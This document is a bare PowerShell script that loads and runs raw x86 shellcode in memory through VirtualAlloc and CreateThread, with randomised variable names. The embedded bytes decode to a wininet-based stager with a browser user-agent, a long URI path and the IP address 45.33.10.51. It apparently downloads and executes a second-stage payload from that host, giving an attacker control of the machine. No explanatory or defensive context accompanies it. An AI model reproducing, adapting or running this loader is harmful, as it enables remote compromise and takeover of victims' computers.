$JTwUvxjOdXuQZ = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$DNBFzknPJwuXziQ = Add-Type -memberDefinition $JTwUvxjOdXuQZ -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $fUhjzazs = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x89,0xe5,0x8b,0x72,0x28,0x31,0xff,0xf,0xb7,0x4a,0x26,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x50,0x8b,0x58,0x20,0x8b,0x48,0x18,0x1,0xd3,0x85,0xc9,0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xc0,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x0,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x68,0xfc,0x3,0x0,0x0,0xe8,0x77,0x1,0x0,0x0,0x2f,0x52,0x62,0x5a,0x57,0x73,0x79,0x4c,0x6e,0x58,0x71,0x74,0x72,0x67,0x47,0x71,0x42,0x43,0x76,0x71,0x78,0x50,0x67,0x69,0x69,0x57,0x61,0x43,0x76,0x6e,0x43,0x31,0x49,0x2d,0x54,0x6e,0x75,0x54,0x6a,0x32,0x30,0x70,0x49,0x34,0x75,0x72,0x6e,0x36,0x6e,0x35,0x6f,0x75,0x37,0x41,0x4d,0x6a,0x32,0x42,0x4a,0x44,0x5a,0x62,0x44,0x4d,0x6b,0x63,0x35,0x30,0x77,0x56,0x55,0x77,0x64,0x66,0x54,0x41,0x5f,0x47,0x63,0x62,0x37,0x69,0x72,0x6f,0x68,0x39,0x77,0x66,0x70,0x39,0x4e,0x4f,0x52,0x5a,0x62,0x39,0x58,0x64,0x79,0x4c,0x46,0x53,0x52,0x64,0x75,0x4f,0x34,0x77,0x76,0x2d,0x4e,0x52,0x70,0x63,0x46,0x50,0x5a,0x45,0x34,0x44,0x64,0x70,0x6a,0x53,0x58,0x30,0x76,0x63,0x6c,0x43,0x70,0x7a,0x72,0x66,0x38,0x6e,0x68,0x44,0x48,0x49,0x4d,0x7a,0x51,0x2d,0x36,0x35,0x63,0x34,0x51,0x6d,0x79,0x59,0x61,0x73,0x5a,0x49,0x39,0x45,0x51,0x76,0x6c,0x45,0x2d,0x35,0x79,0x6f,0x2d,0x34,0x56,0x65,0x41,0x72,0x66,0x53,0x38,0x33,0x51,0x48,0x49,0x78,0x45,0x38,0x46,0x57,0x47,0x4f,0x79,0x6f,0x7a,0x74,0x64,0x47,0x5a,0x77,0x74,0x4b,0x6a,0x37,0x74,0x52,0x34,0x6d,0x41,0x6e,0x53,0x38,0x6c,0x4a,0x5a,0x72,0x68,0x33,0x74,0x39,0x6b,0x30,0x4f,0x44,0x6a,0x5f,0x53,0x6f,0x4b,0x49,0x35,0x6f,0x4a,0x5f,0x4b,0x51,0x31,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x48,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x34,0x35,0x2e,0x33,0x33,0x2e,0x31,0x30,0x2e,0x35,0x31,0x0,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5


$DJGDRPlz = $DNBFzknPJwuXziQ::VirtualAlloc(0,[Math]::Max($fUhjzazs.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($fUhjzazs,0,$DJGDRPlz,$fUhjzazs.Length)

$DNBFzknPJwuXziQ::CreateThread(0,0,$DJGDRPlz,0,0,0)